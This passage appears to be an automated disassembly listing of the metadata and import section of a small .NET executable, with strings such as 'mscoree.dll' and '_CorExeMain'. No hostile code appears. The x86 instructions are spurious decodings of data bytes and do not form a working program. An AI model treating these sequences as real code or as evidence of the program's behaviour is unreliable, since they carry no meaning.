  40b73f:	00 12                	add    %dl,(%edx)
  40b741:	82 19 08             	sbbb   $0x8,(%ecx)
  40b744:	07                   	pop    %es
  40b745:	02 12                	add    (%edx),%dl
  40b747:	82 0d 12 82 11 09 07 	orb    $0x7,0x9118212
  40b74e:	05 02 08 0e 12       	add    $0x120e0802,%eax
  40b753:	80 a5 0e 0f 07 06 1c 	andb   $0x1c,0x6070f0e(%ebp)
  40b75a:	12 80 ad 12 80 b1    	adc    -0x4e7fed53(%eax),%al
  40b760:	1d 1c 1d 1c 1d       	sbb    $0x1d1c1d1c,%eax
  40b765:	02 05 20 00 12 81    	add    0x81120020,%al
  40b76b:	e5 06                	in     $0x6,%eax
  40b76d:	20 00                	and    %al,(%eax)
  40b76f:	1d 12 82 21 06       	sbb    $0x6218212,%eax
  40b774:	20 02                	and    %al,(%edx)
  40b776:	1c 1c                	sbb    $0x1c,%al
  40b778:	1d 1c 0f 07 06       	sbb    $0x6070f1c,%eax
  40b77d:	1c 12                	sbb    $0x12,%al
  40b77f:	81 ed 1c 12 81 e5    	sub    $0xe581121c,%ebp
  40b785:	1d 1c 12 80 a5       	sbb    $0xa580121c,%eax
  40b78a:	05 00 00 12 82       	add    $0x82120000,%eax
  40b78f:	25 05 20 01 1d       	and    $0x1d012005,%eax
  40b794:	05 0e 0a 20 04       	add    $0x4200a0e,%eax
  40b799:	08 1d 05 08 08 11    	or     %bl,0x11080805
  40b79f:	81 41 0c 07 05 1d 05 	addl   $0x51d0507,0xc(%ecx)
  40b7a6:	0e                   	push   %cs
  40b7a7:	12 19                	adc    (%ecx),%bl
  40b7a9:	12 80 a5 1d 0e 06    	adc    0x60e1da5(%eax),%al
  40b7af:	20 01                	and    %al,(%ecx)
  40b7b1:	01 11                	add    %edx,(%ecx)
  40b7b3:	82 2d 01 22 04 06 12 	subb   $0x12,0x6042201
  40b7ba:	80 d9 05             	sbb    $0x5,%cl
  40b7bd:	20 02                	and    %al,(%edx)
  40b7bf:	01 0e                	add    %ecx,(%esi)
  40b7c1:	02 1f                	add    (%edi),%bl
  40b7c3:	07                   	pop    %es
  40b7c4:	0b 12                	or     (%edx),%edx
  40b7c6:	80 a5 12 80 a5 12 80 	andb   $0x80,0x12a58012(%ebp)
  40b7cd:	d9 12                	fsts   (%edx)
  40b7cf:	80 a5 12 80 a5 0e 12 	andb   $0x12,0xea58012(%ebp)
  40b7d6:	80 a5 0e 12 82 31 12 	andb   $0x12,0x3182120e(%ebp)
  40b7dd:	80 a5 12 80 b1 06 07 	andb   $0x7,0x6b18012(%ebp)
  40b7e4:	02 18                	add    (%eax),%bl
  40b7e6:	12 80 ad 04 00 01    	adc    0x10004ad(%eax),%al
  40b7ec:	18 08                	sbb    %cl,(%eax)
  40b7ee:	05 00 02 02 18       	add    $0x18020200,%eax
  40b7f3:	18 04 00             	sbb    %al,(%eax,%eax,1)
  40b7f6:	01 08                	add    %ecx,(%eax)
  40b7f8:	18 04 00             	sbb    %al,(%eax,%eax,1)
  40b7fb:	01 09                	add    %ecx,(%ecx)
  40b7fd:	1c 04                	sbb    $0x4,%al
  40b7ff:	00 01                	add    %al,(%ecx)
  40b801:	02 1c 04             	add    (%esp,%eax,1),%bl
  40b804:	00 01                	add    %al,(%ecx)
  40b806:	08 1c 05 00 02 02 1c 	or     %bl,0x1c020200(,%eax,1)
  40b80d:	1c 0b                	sbb    $0xb,%al
  40b80f:	07                   	pop    %es
  40b810:	07                   	pop    %es
  40b811:	18 1c 1c             	sbb    %bl,(%esp,%ebx,1)
  40b814:	1c 1c                	sbb    $0x1c,%al
  40b816:	12 82 31 0e 09 07    	adc    0x7090e31(%edx),%al
  40b81c:	06                   	push   %es
  40b81d:	0e                   	push   %cs
  40b81e:	09 18                	or     %ebx,(%eax)
  40b820:	12 31                	adc    (%ecx),%dh
  40b822:	1c 1c                	sbb    $0x1c,%al
  40b824:	06                   	push   %es
  40b825:	00 01                	add    %al,(%ecx)
  40b827:	12 80 ad 08 0a 07    	adc    0x70a08ad(%eax),%al
  40b82d:	06                   	push   %es
  40b82e:	0e                   	push   %cs
  40b82f:	09 18                	or     %ebx,(%eax)
  40b831:	1c 1c                	sbb    $0x1c,%al
  40b833:	12 80 a5 01 15 06    	adc    0x61501a5(%eax),%al
  40b839:	00 01                	add    %al,(%ecx)
  40b83b:	01 12                	add    %edx,(%edx)
  40b83d:	82 4d 06 07          	orb    $0x7,0x6(%ebp)
  40b841:	02 02                	add    (%edx),%al
  40b843:	12 80 a5 01 02 06    	adc    0x60201a5(%eax),%al
  40b849:	20 01                	and    %al,(%ecx)
  40b84b:	1d 05 1d 05 0c       	sbb    $0xc051d05,%eax
  40b850:	00 05 01 12 82 65    	add    %al,0x65821201
  40b856:	08 12                	or     %dl,(%edx)
  40b858:	82 65 08 08          	andb   $0x8,0x8(%ebp)
  40b85c:	05 20 01 01 1d       	add    $0x1d010120,%eax
  40b861:	05 06 20 01 01       	add    $0x1012006,%eax
  40b866:	11 82 6d 05 20 00    	adc    %eax,0x20056d(%edx)
  40b86c:	12 82 59 08 20 03    	adc    0x3200859(%edx),%al
  40b872:	1d 05 1d 05 08       	sbb    $0x8051d05,%eax
  40b877:	08 13                	or     %dl,(%ebx)
  40b879:	07                   	pop    %es
  40b87a:	08 12                	or     %dl,(%edx)
  40b87c:	82 55 1d 05          	adcb   $0x5,0x1d(%ebp)
  40b880:	1c 0e                	sbb    $0xe,%al
  40b882:	12 82 59 1d 05 12    	adc    0x12051d59(%edx),%al
  40b888:	82 5d 1d 05          	sbbb   $0x5,0x1d(%ebp)
  40b88c:	04 20                	add    $0x20,%al
  40b88e:	01 01                	add    %eax,(%ecx)
  40b890:	0a 04 07             	or     (%edi,%eax,1),%al
  40b893:	01 1d 0e 06 00 01    	add    %ebx,0x100060e
  40b899:	11 82 75 0e 04 20    	adc    %eax,0x20040e75(%edx)
  40b89f:	01 03                	add    %eax,(%ebx)
  40b8a1:	08 05 20 01 12 31    	or     %al,0x31120120
  40b8a7:	03 07                	add    (%edi),%eax
  40b8a9:	07                   	pop    %es
  40b8aa:	04 0e                	add    $0xe,%al
  40b8ac:	12 31                	adc    (%ecx),%dh
  40b8ae:	08 08                	or     %cl,(%eax)
  40b8b0:	06                   	push   %es
  40b8b1:	10 01                	adc    %al,(%ecx)
  40b8b3:	01 08                	add    %ecx,(%eax)
  40b8b5:	1e                   	push   %ds
  40b8b6:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40b8b9:	01 11                	add    %edx,(%ecx)
  40b8bb:	44                   	inc    %esp
  40b8bc:	06                   	push   %es
  40b8bd:	20 01                	and    %al,(%ecx)
  40b8bf:	11 41 11             	adc    %eax,0x11(%ecx)
  40b8c2:	41                   	inc    %ecx
  40b8c3:	04 07                	add    $0x7,%al
  40b8c5:	02 1c 08             	add    (%eax,%ecx,1),%bl
  40b8c8:	06                   	push   %es
  40b8c9:	07                   	pop    %es
  40b8ca:	03 0e                	add    (%esi),%ecx
  40b8cc:	12 31                	adc    (%ecx),%dh
  40b8ce:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40b8d1:	01 1d 05 05 20 01    	add    %ebx,0x1200505
  40b8d7:	0e                   	push   %cs
  40b8d8:	1d 05 05 07 02       	sbb    $0x2070505,%eax
  40b8dd:	0e                   	push   %cs
  40b8de:	1d 1c 0e 07 07       	sbb    $0x7070e1c,%eax
  40b8e3:	1d 05 0e 12 82       	sbb    $0x82120e05,%eax
  40b8e8:	5d                   	pop    %ebp
  40b8e9:	12 31                	adc    (%ecx),%dh
  40b8eb:	05 08 1d 05 09       	add    $0x9051d08,%eax
  40b8f0:	20 02                	and    %al,(%edx)
  40b8f2:	12 80 d9 0e 11 82    	adc    -0x7deef127(%eax),%al
  40b8f8:	81 08 20 03 01 0e    	orl    $0xe010320,(%eax)
  40b8fe:	1c 11                	sbb    $0x11,%al
  40b900:	82 85 09 07 03 02 12 	addb   $0x12,0x2030709(%ebp)
  40b907:	80 d9 12             	sbb    $0x12,%cl
  40b90a:	80 a5 06 20 01 12 80 	andb   $0x80,0x12012006(%ebp)
  40b911:	d9 0e                	(bad) (%esi)
  40b913:	0b 07                	or     (%edi),%eax
  40b915:	04 1d                	add    $0x1d,%al
  40b917:	05 12 80 d9 1c       	add    $0x1cd98012,%eax
  40b91c:	12 80 a5 06 00 02    	adc    0x20006a5(%eax),%al
  40b922:	08 1d 05 08 09 20    	or     %bl,0x20090805
  40b928:	02 01                	add    (%ecx),%al
  40b92a:	12 81 85 11 82 91    	adc    -0x6e7dee7b(%ecx),%al
  40b930:	10 07                	adc    %al,(%edi)
  40b932:	09 1d 05 1c 1c 1d    	or     %ebx,0x1d1c1c05
  40b938:	05 1c 1c 1d 1c       	add    $0x1c1d1c1c,%eax
  40b93d:	1d 1c 1d 02 05       	sbb    $0x5021d1c,%eax
  40b942:	00 01                	add    %al,(%ecx)
  40b944:	1d 05 08 0d 07       	sbb    $0x70d0805,%eax
  40b949:	07                   	pop    %es
  40b94a:	1d 05 1c 1c 1c       	sbb    $0x1c1c1c05,%eax
  40b94f:	1d 1c 1d 1c 1d       	sbb    $0x1d1c1d1c,%eax
  40b954:	02 12                	add    (%edx),%dl
  40b956:	07                   	pop    %es
  40b957:	06                   	push   %es
  40b958:	12 82 55 1d 05 12    	adc    0x12051d55(%edx),%al
  40b95e:	82 5d 1d 05          	sbbb   $0x5,0x1d(%ebp)
  40b962:	12 82 59 12 80 a5    	adc    -0x5a7feda7(%edx),%al
  40b968:	07                   	pop    %es
  40b969:	20 03                	and    %al,(%ebx)
  40b96b:	01 02                	add    %eax,(%edx)
  40b96d:	0e                   	push   %cs
  40b96e:	10 02                	adc    %al,(%edx)
  40b970:	06                   	push   %es
  40b971:	20 01                	and    %al,(%ecx)
  40b973:	01 11                	add    %edx,(%ecx)
  40b975:	82 99 01 08 08 01 00 	sbbb   $0x0,0x1080801(%ecx)
  40b97c:	08 00                	or     %al,(%eax)
  40b97e:	00 00                	add    %al,(%eax)
  40b980:	00 00                	add    %al,(%eax)
  40b982:	1e                   	push   %ds
  40b983:	01 00                	add    %eax,(%eax)
  40b985:	01 00                	add    %eax,(%eax)
  40b987:	54                   	push   %esp
  40b988:	02 16                	add    (%esi),%dl
  40b98a:	57                   	push   %edi
  40b98b:	72 61                	jb     0x40b9ee
  40b98d:	70 4e                	jo     0x40b9dd
  40b98f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b990:	6e                   	outsb  %ds:(%esi),(%dx)
  40b991:	45                   	inc    %ebp
  40b992:	78 63                	js     0x40b9f7
  40b994:	65 70 74             	gs jo  0x40ba0b
  40b997:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40b99e:	77 73                	ja     0x40ba13
  40b9a0:	01 29                	add    %ebp,(%ecx)
  40b9a2:	01 00                	add    %eax,(%eax)
  40b9a4:	24 65                	and    $0x65,%al
  40b9a6:	36 64 64 39 63 61    	ss fs cmp %esp,%fs:0x61(%ebx)
  40b9ac:	62 2d 39 35 30 35    	bound  %ebp,0x35303539
  40b9b2:	2d 34 65 62 39       	sub    $0x39626534,%eax
  40b9b7:	2d 39 66 63 64       	sub    $0x64636639,%eax
  40b9bc:	2d 36 36 37 64       	sub    $0x64373636,%eax
  40b9c1:	30 37                	xor    %dh,(%edi)
  40b9c3:	61                   	popa
  40b9c4:	30 32                	xor    %dh,(%edx)
  40b9c6:	64 64 30 00          	fs xor %al,%fs:(%eax)
  40b9ca:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40b9cd:	00 07                	add    %al,(%edi)
  40b9cf:	31 2e                	xor    %ebp,(%esi)
  40b9d1:	30 2e                	xor    %ch,(%esi)
  40b9d3:	30 2e                	xor    %ch,(%esi)
  40b9d5:	30 00                	xor    %al,(%eax)
  40b9d7:	00 00                	add    %al,(%eax)
  40b9d9:	ba 00 00 00 00       	mov    $0x0,%edx
  40b9de:	00 00                	add    %al,(%eax)
  40b9e0:	00 00                	add    %al,(%eax)
  40b9e2:	00 00                	add    %al,(%eax)
  40b9e4:	1e                   	push   %ds
  40b9e5:	ba 00 00 00 20       	mov    $0x20000000,%edx
	...
  40b9fe:	00 00                	add    %al,(%eax)
  40ba00:	10 ba 00 00 00 00    	adc    %bh,0x0(%edx)
	...
  40ba12:	5f                   	pop    %edi
  40ba13:	43                   	inc    %ebx
  40ba14:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba15:	72 45                	jb     0x40ba5c
  40ba17:	78 65                	js     0x40ba7e
  40ba19:	4d                   	dec    %ebp
  40ba1a:	61                   	popa
  40ba1b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40ba22:	72 65                	jb     0x40ba89
  40ba24:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40ba28:	6c                   	insb   (%dx),%es:(%edi)
  40ba29:	00 00                	add    %al,(%eax)
  40ba2b:	00 00                	add    %al,(%eax)
  40ba2d:	00 ff                	add    %bh,%bh
  40ba2f:	25 00 20 40 00       	and    $0x402000,%eax
